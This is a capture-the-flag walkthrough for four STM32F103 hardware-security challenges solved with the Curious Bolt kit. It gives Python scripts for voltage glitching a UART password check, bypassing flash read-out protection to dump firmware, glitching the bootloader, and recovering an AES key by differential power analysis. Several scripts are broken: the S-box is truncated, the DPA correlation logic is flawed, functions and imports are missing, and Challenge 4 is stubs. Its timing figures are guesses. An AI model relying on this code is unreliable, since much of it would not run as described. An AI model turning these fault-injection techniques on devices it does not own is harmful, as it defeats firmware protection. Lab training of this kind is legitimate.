# Curious Bolt ECSC23 Challenges Walkthrough
## STM32F103 Target Board - Hardware Security Challenges

This guide walks you through solving the 4 hardware security challenges from the European Cyber Security Challenge 2023 (ECSC23) that come with the Curious Bolt kit.

---

## Table of Contents

1. [Hardware Overview](#hardware-overview)
2. [Software Setup](#software-setup)
3. [Bolt Capabilities Quick Reference](#bolt-capabilities)
4. [Challenge 1: UART Password Bypass via Glitching](#challenge-1)
5. [Challenge 2: RDP Bypass - Flash Memory Extraction](#challenge-2)
6. [Challenge 3: Side-Channel Attack - Power Analysis](#challenge-3)
7. [Challenge 4: Advanced Glitching - Bootloader Bypass](#challenge-4)
8. [Troubleshooting](#troubleshooting)
9. [Additional Resources](#resources)

---

## Hardware Overview {#hardware-overview}

### What's in the Kit

| Component | Purpose |
|-----------|---------|
| **Curious Bolt** | Voltage glitcher, logic analyzer, power scope |
| **STM32F103 Target Board** | Target with 4 challenges programmed |
| **STM32 SWD Programmer** | For reprogramming target (if needed) |
| **Dupont Cables** | Connections between Bolt and target |
| **Logic Analyzer Probes** | For protocol analysis |

### Target Board Layout

The STM32F103 target board has labeled test points:

```
┌─────────────────────────────────────────┐
│  STM32F103 ECSC23 Target Board          │
│                                         │
│  [VMCU] - MCU voltage (for glitching)   │
│  [GND]  - Ground reference              │
│  [TX]   - UART transmit                 │
│  [RX]   - UART receive                  │
│  [RST]  - Reset line                    │
│  [BOOT0]- Boot mode selection           │
│  [SWDIO]- SWD data                      │
│  [SWCLK]- SWD clock                     │
│  [3V3]  - 3.3V power input              │
│                                         │
│         ┌──────────┐                    │
│         │ STM32F103│                    │
│         │          │                    │
│         └──────────┘                    │
└─────────────────────────────────────────┘
```

### Curious Bolt Pinout

```
┌─────────────────────────────────────────┐
│  Curious Bolt Pinout                    │
│                                         │
│  GLITCH SECTION:                        │
│  [GND] [SIG] - Glitch signal output     │
│                                         │
│  LOGIC ANALYZER:                        │
│  [0][1][2][3][4][5][6][7] - 8 channels  │
│  [GND] - Ground reference               │
│                                         │
│  POWER SCOPE (ADC):                     │
│  [GND][GND][ADC] - Differential input   │
│                                         │
│  TRIGGER/IO:                            │
│  [IO0][IO1] - Programmable I/O          │
│                                         │
└─────────────────────────────────────────┘
```

---

## Software Setup {#software-setup}

### 1. Install Python Dependencies

```bash
# Create virtual environment (recommended)
python3 -m venv ~/bolt-venv
source ~/bolt-venv/bin/activate

# Install required packages
pip install pyserial numpy matplotlib

# Clone Bolt library
git clone https://github.com/tjclement/bolt.git
cd bolt
pip install -e .
```

### 2. Install PulseView (Logic Analyzer)

```bash
# macOS
brew install --cask pulseview

# Linux
sudo apt install -y sigrok pulseview
```

### 3. Install Serial Terminal

```bash
# macOS
brew install tio minicom

# Linux
sudo apt install -y tio minicom picocom
```

### 4. Install OpenOCD (for SWD/JTAG)

```bash
# macOS
brew install openocd

# Linux
sudo apt install -y openocd
```

### 5. Verify Bolt Connection

```python
#!/usr/bin/env python3
# test_bolt.py - Verify Bolt is working

from scope import Scope

try:
    s = Scope()
    print("✓ Curious Bolt connected successfully!")
    print(f"  Firmware version: {s.fw_version}")
except Exception as e:
    print(f"✗ Failed to connect: {e}")
```

### 6. Linux USB Permissions

```bash
# Create udev rule for Bolt
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="2e8a", MODE="0666", GROUP="plugdev"' | \
    sudo tee /etc/udev/rules.d/99-curious-bolt.rules

sudo udevadm control --reload-rules
sudo udevadm trigger
sudo usermod -a -G plugdev,dialout $USER
# Log out and back in
```

---

## Bolt Capabilities Quick Reference {#bolt-capabilities}

### Voltage Glitcher

```python
from scope import Scope
s = Scope()

# Configure glitch duration (8.3ns per unit)
s.glitch.repeat = 60  # ~500ns glitch

# Manual trigger
s.trigger()

# External trigger (on falling edge of channel 0)
s.arm(0, Scope.FALLING_EDGE)

# Delay after trigger (8.3ns per unit)
s.glitch.ext_offset = 1000  # ~8.3µs delay
```

### Differential Power Scope

```python
from scope import Scope
s = Scope()

# Capture power trace
s.trigger()

# Get raw data
trace = s.get_last_trace()

# Plot the trace
s.plot_last_trace()
```

### Logic Analyzer (via PulseView)

The Bolt appears as a SUMP-compatible logic analyzer:
1. Open PulseView
2. Select device: "fx2lafw" or scan for SUMP devices
3. Configure sample rate and channels
4. Add protocol decoders (UART, SPI, I2C)

---

## Challenge 1: UART Password Bypass via Glitching {#challenge-1}

### Objective
Bypass the password check on the UART console to get the flag.

### Background
The target presents a password prompt over UART. Even with the correct password unknown, a well-timed voltage glitch can cause the password comparison to succeed.

### Wiring

```
Target          Curious Bolt
──────          ────────────
GND      ────── GND (any)
TX       ────── Channel 0 (Logic Analyzer)
RX       ────── (connect to USB-UART adapter TX)
VMCU     ────── SIG (Glitcher)
RST      ────── IO0 (optional, for reset control)
```

You'll also need a USB-to-UART adapter:
```
USB-UART        Target
────────        ──────
TX       ────── RX
RX       ────── TX
GND      ────── GND
```

### Step 1: Explore the UART Interface

```bash
# Connect to target UART (typically 115200 baud)
tio -b 115200 /dev/ttyUSB0
```

You should see something like:
```
=== ECSC23 Challenge 1 ===
Enter password: 
```

Try entering random passwords to understand the behavior:
- Wrong password → "Access denied" + slight delay
- The delay is our timing reference

### Step 2: Understand the Timing

Use the logic analyzer to measure:
1. When you send the password
2. When the target sends the response
3. The delay between receiving password and response

```python
#!/usr/bin/env python3
# ch1_analyze_timing.py

import serial
import time
from scope import Scope

# Setup
s = Scope()
uart = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

# Arm logic analyzer on UART RX activity
# This helps us see the timing

# Send test password
uart.write(b'test\r\n')

# Read response
response = uart.read(100)
print(f"Response: {response}")
```

### Step 3: The Glitch Attack

The password check in C likely looks like:
```c
if (strcmp(input, correct_password) == 0) {
    print_flag();  // We want to reach here
} else {
    print("Access denied");
}
```

We want to glitch during the `strcmp` or the conditional branch to make it succeed.

```python
#!/usr/bin/env python3
# ch1_glitch_attack.py

import serial
import time
from scope import Scope

def try_glitch(offset, width):
    """
    Try a single glitch attempt
    offset: delay after sending password (in 8.3ns units)
    width: glitch duration (in 8.3ns units)
    """
    s = Scope()
    uart = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
    
    # Configure glitch
    s.glitch.repeat = width
    s.glitch.ext_offset = offset
    
    # Flush any pending data
    uart.reset_input_buffer()
    
    # Send password and arm glitch
    # Arm on TX line going high (start of response)
    s.arm(0, Scope.RISING_EDGE)
    
    uart.write(b'wrong_password\r\n')
    
    # Wait for response
    time.sleep(0.5)
    response = uart.read(200).decode('utf-8', errors='ignore')
    
    uart.close()
    return response

def main():
    # Glitch parameter search
    # Start with wide ranges, then narrow down
    
    for offset in range(1000, 50000, 500):  # 8.3µs to 415µs
        for width in range(30, 150, 10):     # 250ns to 1.25µs
            
            response = try_glitch(offset, width)
            
            if 'flag' in response.lower() or 'ECSC' in response:
                print(f"[SUCCESS!] offset={offset}, width={width}")
                print(f"Response: {response}")
                return
            elif 'denied' not in response.lower():
                # Interesting response - might be close
                print(f"[INTERESTING] offset={offset}, width={width}")
                print(f"Response: {response}")
            
            # Small delay between attempts
            time.sleep(0.1)

if __name__ == '__main__':
    main()
```

### Step 4: Refine the Attack

Once you find an interesting range:

```python
#!/usr/bin/env python3
# ch1_refined_attack.py

import serial
import time
from scope import Scope

# Narrow range based on initial findings
OFFSET_MIN = 15000  # Adjust based on your findings
OFFSET_MAX = 20000
WIDTH_MIN = 50
WIDTH_MAX = 100

def reset_target():
    """Reset the target board"""
    s = Scope()
    # If RST is connected to IO0
    # s.io.set(0, False)  # Pull low
    # time.sleep(0.1)
    # s.io.set(0, True)   # Release
    # time.sleep(0.5)
    pass

def fine_glitch_search():
    success_count = 0
    attempts = 0
    
    for offset in range(OFFSET_MIN, OFFSET_MAX, 50):
        for width in range(WIDTH_MIN, WIDTH_MAX, 5):
            attempts += 1
            
            response = try_glitch(offset, width)
            
            if 'flag' in response.lower() or 'ECSC' in response:
                success_count += 1
                print(f"\n{'='*50}")
                print(f"FLAG FOUND! (attempt {attempts})")
                print(f"Parameters: offset={offset}, width={width}")
                print(f"Response:\n{response}")
                print(f"{'='*50}\n")
                
                # Keep searching to find optimal parameters
                
            if attempts % 100 == 0:
                print(f"Progress: {attempts} attempts, {success_count} successes")

if __name__ == '__main__':
    fine_glitch_search()
```

### Tips for Challenge 1

1. **Start with the logic analyzer** - Capture UART traffic to understand timing
2. **Power cycle between attempts** - If the target gets into a bad state
3. **Watch for partial successes** - Corrupted responses mean you're close
4. **Try multiple glitch positions**:
   - During password reception
   - During strcmp execution
   - During the branch instruction

---

## Challenge 2: RDP Bypass - Flash Memory Extraction {#challenge-2}

### Objective
Bypass Read-Out Protection (RDP) to dump the flash memory containing the flag.

### Background
STM32F103 has Read-Out Protection that prevents reading flash via SWD/JTAG. Voltage glitching during the RDP check can bypass this protection.

### Understanding STM32F103 RDP

```
RDP Levels:
- Level 0 (0xA5): No protection - full access
- Level 1 (any other value): Flash protected from debugger
- (F103 doesn't have Level 2)

On boot, the chip reads the RDP option byte.
If we glitch during this read, it may read wrong value → no protection!
```

### Wiring for Challenge 2

```
Target          Curious Bolt
──────          ────────────
GND      ────── GND
VMCU     ────── SIG (Glitcher)
3V3      ────── (powered by Bolt or external)
RST      ────── IO0 (for controlled reset)

SWD Programmer   Target
──────────────   ──────
SWDIO     ────── SWDIO
SWCLK     ────── SWCLK
GND       ────── GND
```

### Step 1: Verify RDP is Enabled

```bash
# Try to connect with OpenOCD
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg

# If RDP is enabled, you'll see:
# "Device is read protected"
# or connection will fail
```

### Step 2: Understand the Boot Timing

The RDP check happens early in boot. We need to:
1. Reset the chip
2. Glitch at the exact moment of RDP byte read
3. Quickly connect debugger before chip realizes

```python
#!/usr/bin/env python3
# ch2_boot_timing.py

from scope import Scope
import time

s = Scope()

# Configure power scope to capture boot sequence
# Connect ADC to VMCU to see power signature

def capture_boot():
    """Capture power trace during boot"""
    
    # Hold reset
    s.io.set(0, False)
    time.sleep(0.1)
    
    # Arm scope to trigger on reset release
    s.arm(0, Scope.RISING_EDGE)
    
    # Release reset
    s.io.set(0, True)
    
    # Wait for capture
    time.sleep(0.1)
    
    # Plot the power trace
    s.plot_last_trace()
    
    # The RDP check will show as a specific pattern
    # Usually within first 10-50µs of boot

capture_boot()
```

### Step 3: RDP Bypass Glitch Attack

```python
#!/usr/bin/env python3
# ch2_rdp_bypass.py

import subprocess
import time
from scope import Scope

s = Scope()

def reset_and_glitch(offset, width):
    """
    Reset target with a precisely timed glitch
    """
    # Configure glitch
    s.glitch.repeat = width
    s.glitch.ext_offset = offset
    
    # Hold reset
    s.io.set(0, False)
    time.sleep(0.05)
    
    # Arm glitch to trigger on reset release
    s.arm(0, Scope.RISING_EDGE)
    
    # Release reset - glitch will fire after offset
    s.io.set(0, True)
    
    # Small delay for glitch to complete
    time.sleep(0.01)

def try_connect_openocd():
    """
    Try to connect with OpenOCD and read flash
    """
    try:
        result = subprocess.run(
            ['openocd', 
             '-f', 'interface/stlink.cfg',
             '-f', 'target/stm32f1x.cfg',
             '-c', 'init',
             '-c', 'flash read_image dump.bin 0x08000000 0x10000',
             '-c', 'shutdown'],
            capture_output=True,
            timeout=5,
            text=True
        )
        
        if 'read protected' not in result.stderr.lower():
            return True, result.stdout + result.stderr
        return False, result.stderr
        
    except subprocess.TimeoutExpired:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)

def rdp_bypass_attack():
    """
    Main attack loop
    """
    # RDP check typically happens 5-50µs after reset
    # 1 unit = 8.3ns, so range is ~600-6000 units
    
    for offset in range(500, 8000, 100):
        for width in range(20, 200, 20):
            
            # Perform glitched reset
            reset_and_glitch(offset, width)
            
            # Try to connect
            success, output = try_connect_openocd()
            
            if success:
                print(f"\n{'='*50}")
                print(f"RDP BYPASS SUCCESS!")
                print(f"Parameters: offset={offset}, width={width}")
                print(f"{'='*50}\n")
                
                # Read the flag from dump
                with open('dump.bin', 'rb') as f:
                    data = f.read()
                    # Search for flag pattern
                    if b'ECSC' in data or b'flag' in data:
                        idx = data.find(b'ECSC')
                        if idx == -1:
                            idx = data.find(b'flag')
                        print(f"Flag found at offset {idx}:")
                        print(data[idx:idx+50])
                return
            
            # Brief delay
            time.sleep(0.05)
        
        print(f"Completed offset range {offset}")

if __name__ == '__main__':
    rdp_bypass_attack()
```

### Step 4: Alternative - Bootloader Glitch

If the above doesn't work, try glitching the bootloader's RDP check:

```python
#!/usr/bin/env python3
# ch2_bootloader_glitch.py

import serial
import time
from scope import Scope

"""
STM32F103 Bootloader Commands:
0x00 - Get command
0x01 - Get version
0x02 - Get ID
0x11 - Read memory (blocked by RDP!)
0x21 - Go
0x31 - Write memory
0x43 - Erase
0x63 - Write protect
0x73 - Write unprotect
0x82 - Readout protect
0x92 - Readout unprotect
"""

def enter_bootloader():
    """
    Enter system bootloader mode
    Set BOOT0=1, BOOT1=0, then reset
    """
    # You may need to manually set BOOT0 pin high
    # Or use a jumper on the target board
    pass

def send_bootloader_cmd(uart, cmd):
    """Send command with checksum"""
    uart.write(bytes([cmd, ~cmd & 0xFF]))
    time.sleep(0.01)
    return uart.read(1)

def try_read_memory_glitch(offset, width, address=0x08000000, length=256):
    """
    Try to read memory by glitching during RDP check
    """
    s = Scope()
    
    # Configure glitch
    s.glitch.repeat = width
    s.glitch.ext_offset = offset
    
    uart = serial.Serial('/dev/ttyUSB0', 115200, timeout=1, parity=serial.PARITY_EVEN)
    
    # Sync with bootloader
    uart.write(b'\x7F')
    time.sleep(0.05)
    ack = uart.read(1)
    
    if ack != b'\x79':
        uart.close()
        return None, "Sync failed"
    
    # Send Read Memory command
    # Arm glitch to trigger on command send
    s.arm(0, Scope.FALLING_EDGE)  # Trigger on TX activity
    
    uart.write(bytes([0x11, 0xEE]))  # Read command + checksum
    
    time.sleep(0.01)
    ack = uart.read(1)
    
    if ack == b'\x79':  # ACK - command accepted!
        # Send address
        addr_bytes = address.to_bytes(4, 'big')
        checksum = 0
        for b in addr_bytes:
            checksum ^= b
        uart.write(addr_bytes + bytes([checksum]))
        
        ack = uart.read(1)
        if ack == b'\x79':
            # Send length
            uart.write(bytes([length - 1, ~(length - 1) & 0xFF]))
            
            ack = uart.read(1)
            if ack == b'\x79':
                data = uart.read(length)
                uart.close()
                return data, "Success!"
    
    uart.close()
    return None, "Command rejected"

# Main attack loop similar to before
```

### Tips for Challenge 2

1. **Power supply matters** - Use clean, stable power
2. **Decoupling capacitors** - May need to remove some for better glitch
3. **Glitch injection point** - VCAP pins provide direct access to core voltage
4. **Multiple attempts** - RDP bypass is probabilistic, keep trying
5. **Check with strings** - After dump: `strings dump.bin | grep -i flag`

---

## Challenge 3: Side-Channel Attack - Power Analysis {#challenge-3}

### Objective
Extract a secret key using power analysis (DPA/SPA).

### Background
When a microcontroller processes data, its power consumption varies based on the data being processed. By analyzing these power traces, we can recover secret keys.

### Types of Power Analysis

1. **SPA (Simple Power Analysis)** - Look at a single trace to spot patterns
2. **DPA (Differential Power Analysis)** - Statistical analysis of many traces

### Wiring for Challenge 3

```
Target          Curious Bolt
──────          ────────────
GND      ────── GND (ADC section, both pins!)
VMCU     ────── ADC
TX       ────── Channel 0 (for trigger)
```

### Step 1: Capture Power Traces

```python
#!/usr/bin/env python3
# ch3_capture_traces.py

import serial
import time
import numpy as np
from scope import Scope

s = Scope()
uart = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

def capture_trace(input_data):
    """
    Send input and capture power trace during processing
    """
    # Arm scope to trigger on UART TX (start of our message)
    s.arm(0, Scope.FALLING_EDGE)
    
    # Send input data
    uart.write(input_data)
    
    # Wait for capture
    time.sleep(0.1)
    
    # Get trace data
    trace = s.get_last_trace()
    
    # Read response
    response = uart.read(100)
    
    return trace, response

def collect_traces(num_traces=1000):
    """
    Collect many traces with different inputs
    """
    traces = []
    inputs = []
    
    for i in range(num_traces):
        # Generate random input
        input_data = bytes([np.random.randint(0, 256) for _ in range(16)])
        
        trace, response = capture_trace(input_data)
        
        traces.append(trace)
        inputs.append(input_data)
        
        if i % 100 == 0:
            print(f"Collected {i}/{num_traces} traces")
    
    # Save for analysis
    np.save('traces.npy', np.array(traces))
    np.save('inputs.npy', np.array(inputs))
    
    print(f"Saved {num_traces} traces to traces.npy and inputs.npy")
    return traces, inputs

if __name__ == '__main__':
    traces, inputs = collect_traces(1000)
```

### Step 2: Simple Power Analysis (SPA)

First, look at individual traces to understand the pattern:

```python
#!/usr/bin/env python3
# ch3_spa_analysis.py

import numpy as np
import matplotlib.pyplot as plt

# Load traces
traces = np.load('traces.npy')
inputs = np.load('inputs.npy')

# Plot a few traces overlaid
plt.figure(figsize=(15, 5))
for i in range(10):
    plt.plot(traces[i], alpha=0.5, label=f'Trace {i}')

plt.xlabel('Sample')
plt.ylabel('Power (mV)')
plt.title('Power Traces - SPA View')
plt.legend()
plt.show()

# Look for patterns that correlate with input bytes
# The target might be doing byte-by-byte operations
```

### Step 3: Differential Power Analysis (DPA)

```python
#!/usr/bin/env python3
# ch3_dpa_attack.py

import numpy as np
import matplotlib.pyplot as plt

def hamming_weight(x):
    """Count number of 1 bits"""
    return bin(x).count('1')

def sbox(x):
    """AES S-box (if target uses AES)"""
    # Standard AES S-box
    SBOX = [
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
        # ... (full S-box table)
    ]
    return SBOX[x]

def dpa_attack(traces, plaintexts, byte_index=0):
    """
    Perform DPA attack on one key byte
    """
    num_traces = len(traces)
    trace_length = len(traces[0])
    
    correlations = np.zeros(256)
    best_corr = np.zeros(trace_length)
    best_key = 0
    
    for key_guess in range(256):
        # Compute hypothetical intermediate values
        hypothetical = []
        for pt in plaintexts:
            # Assuming AES: intermediate = S-box(plaintext XOR key)
            intermediate = sbox(pt[byte_index] ^ key_guess)
            hypothetical.append(hamming_weight(intermediate))
        
        hypothetical = np.array(hypothetical)
        
        # Compute correlation with each trace sample
        for sample in range(trace_length):
            trace_values = traces[:, sample]
            correlation = np.corrcoef(hypothetical, trace_values)[0, 1]
            
            if abs(correlation) > abs(best_corr[sample]):
                best_corr[sample] = correlation
        
        # Peak correlation for this key guess
        correlations[key_guess] = np.max(np.abs(best_corr))
    
    # Best key is the one with highest correlation
    best_key = np.argmax(correlations)
    
    return best_key, correlations

def full_key_recovery():
    """
    Recover all 16 bytes of the key
    """
    traces = np.load('traces.npy')
    inputs = np.load('inputs.npy')
    
    recovered_key = []
    
    for byte_idx in range(16):
        key_byte, correlations = dpa_attack(traces, inputs, byte_idx)
        recovered_key.append(key_byte)
        
        print(f"Byte {byte_idx}: 0x{key_byte:02x}")
        
        # Plot correlation
        plt.figure(figsize=(10, 4))
        plt.bar(range(256), correlations)
        plt.xlabel('Key Guess')
        plt.ylabel('Correlation')
        plt.title(f'DPA Correlations for Byte {byte_idx}')
        plt.savefig(f'dpa_byte_{byte_idx}.png')
        plt.close()
    
    key_hex = ''.join(f'{b:02x}' for b in recovered_key)
    print(f"\nRecovered Key: {key_hex}")
    
    return recovered_key

if __name__ == '__main__':
    key = full_key_recovery()
```

### Step 4: Verify the Key

```python
#!/usr/bin/env python3
# ch3_verify_key.py

import serial

uart = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

# Try the recovered key
recovered_key = bytes([...])  # Your recovered key bytes

uart.write(b'KEY:' + recovered_key.hex().encode() + b'\n')
response = uart.read(200)

print(f"Response: {response}")
# Should contain the flag if key is correct!
```

### Tips for Challenge 3

1. **Alignment is crucial** - Traces must be aligned in time
2. **More traces = better** - Start with 1000, go up to 10000 if needed
3. **Clean power measurement** - Good GND connection is essential
4. **Know the algorithm** - Understanding what's being computed helps
5. **Use correlation** - Peak correlation reveals the correct key byte

---

## Challenge 4: Advanced Glitching - Bootloader Bypass {#challenge-4}

### Objective
Bypass multiple security checks using precisely timed glitches.

### Background
This challenge requires bypassing security checks in sequence, possibly including:
- Boot sequence protection
- Authentication
- Memory access controls

### Strategy: Multi-Glitch Attack

```python
#!/usr/bin/env python3
# ch4_multi_glitch.py

import time
from scope import Scope

s = Scope()

def multi_glitch_attack(glitch_params):
    """
    Perform multiple glitches in sequence
    glitch_params: list of (offset, width) tuples
    """
    
    for offset, width in glitch_params:
        s.glitch.repeat = width
        s.glitch.ext_offset = offset
        
        # Arm and trigger
        s.arm(0, Scope.RISING_EDGE)
        
        # Wait for glitch to complete
        time.sleep(0.001)

def find_multi_glitch_params():
    """
    Search for the right combination of glitch timings
    """
    # This is challenge-specific
    # You may need to:
    # 1. Glitch during first boot check
    # 2. Then glitch during authentication
    # 3. Then glitch during memory access
    
    # Start by finding each timing individually
    # Then combine them
    pass
```

### Using Power Analysis to Find Glitch Points

```python
#!/usr/bin/env python3
# ch4_find_glitch_points.py

import numpy as np
import matplotlib.pyplot as plt
from scope import Scope

s = Scope()

def capture_boot_power():
    """
    Capture power trace during entire boot sequence
    to identify security check locations
    """
    # Reset target
    s.io.set(0, False)
    time.sleep(0.1)
    
    # Arm scope
    s.arm(0, Scope.RISING_EDGE)
    
    # Release reset
    s.io.set(0, True)
    
    # Wait for boot
    time.sleep(0.2)
    
    # Get power trace
    trace = s.get_last_trace()
    
    # Plot
    plt.figure(figsize=(15, 5))
    plt.plot(trace)
    plt.xlabel('Sample')
    plt.ylabel('Power')
    plt.title('Boot Sequence Power Profile')
    
    # Mark potential security check locations
    # (look for distinctive patterns)
    
    plt.show()
    
    return trace

# Use this to identify the timing windows for each security check
# Then develop a multi-glitch attack
```

---

## Troubleshooting {#troubleshooting}

### Bolt Not Detected

```bash
# Check USB connection
lsusb | grep -i "2e8a"

# Check permissions (Linux)
ls -la /dev/ttyACM*

# Try replugging or different USB port
```

### Glitches Not Working

1. **Check physical connections**
   - Glitch signal must be connected to VMCU/VCC
   - Good ground connection is essential
   
2. **Verify glitch is firing**
   - Use oscilloscope or logic analyzer on glitch line
   
3. **Adjust parameters**
   - Try wider glitch widths first (100+ units)
   - Sweep offset over larger range
   
4. **Power cycling**
   - Target may need reset between attempts

### No Power Traces

1. **ADC connections**
   - Connect BOTH GND pins near ADC
   - ADC pin to VMCU (close to MCU)
   
2. **Trigger issues**
   - Verify trigger signal is correct
   - Try manual trigger first: `s.trigger()`

### UART Communication Issues

```bash
# Check baud rate (try common values)
tio -b 9600 /dev/ttyUSB0
tio -b 115200 /dev/ttyUSB0
tio -b 921600 /dev/ttyUSB0

# Check for correct parity (STM32 bootloader uses even parity)
```

---

## Additional Resources {#resources}

### Documentation

- [Curious Bolt Official Docs](https://bolt.curious.supplies/docs/)
- [Bolt GitHub Repository](https://github.com/tjclement/bolt)
- [Community Solutions](https://github.com/kxynos/cs-bolt-p-glitching)

### Background Reading

**Voltage Glitching:**
- "Shaping the Glitch: Optimizing Voltage Fault Injection Attacks" - TCHES 2019
- [SEC Consult STM32 Glitching Blog](https://sec-consult.com/blog/detail/secglitcher-part-1-reproducible-voltage-glitching-on-stm32-microcontrollers/)

**Power Analysis:**
- "Differential Power Analysis" - Kocher et al.
- [ChipWhisperer Tutorials](https://chipwhisperer.readthedocs.io/)

**STM32 Security:**
- [AN5156: Introduction to security for STM32 MCUs](https://www.st.com/resource/en/application_note/an5156-introduction-to-security-for-stm32-mcus-stmicroelectronics.pdf)
- [Joe Grand's Trezor Wallet Hack](https://www.youtube.com/watch?v=dT9y-KQbqi4)

### Tools

- **PulseView/sigrok** - Logic analyzer software
- **OpenOCD** - JTAG/SWD debugging
- **STM32CubeProgrammer** - Official ST programming tool
- **ChipWhisperer** - Advanced glitching platform

### Community

- [NewAE Forum](https://forum.newae.com/) - ChipWhisperer community
- [/r/hardwarehacking](https://reddit.com/r/hardwarehacking)

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────────────┐
│ Curious Bolt ECSC23 Quick Reference                          │
├─────────────────────────────────────────────────────────────┤
│ GLITCH SETUP:                                                │
│   from scope import Scope                                    │
│   s = Scope()                                               │
│   s.glitch.repeat = 60      # Width (8.3ns units)          │
│   s.glitch.ext_offset = 1000 # Delay after trigger          │
│   s.arm(0, Scope.FALLING_EDGE)  # Arm on channel 0         │
│   s.trigger()               # Manual trigger                │
│                                                              │
│ POWER SCOPE:                                                 │
│   s.trigger()               # Capture trace                 │
│   s.get_last_trace()        # Get raw data                  │
│   s.plot_last_trace()       # Plot it                       │
│                                                              │
│ COMMON TIMINGS:                                              │
│   Password check: 10-50µs after response start              │
│   RDP check: 5-50µs after reset                             │
│   1 unit = 8.3ns                                            │
│   1µs = ~120 units                                          │
│   10µs = ~1200 units                                        │
│                                                              │
│ WIRING:                                                      │
│   Glitch: GND→GND, SIG→VMCU                                 │
│   Scope: GND→GND (x2), ADC→VMCU                            │
│   Trigger: Use logic analyzer channel                       │
│                                                              │
│ DEBUG:                                                       │
│   openocd -f interface/stlink.cfg -f target/stm32f1x.cfg   │
└─────────────────────────────────────────────────────────────┘
```

---

**Good luck with the challenges!** 

Remember: Hardware hacking is an iterative process. Don't get discouraged if it doesn't work on the first try. Keep adjusting parameters, improving your physical setup, and learning from each attempt.

*Document version: 1.0 - January 2026*
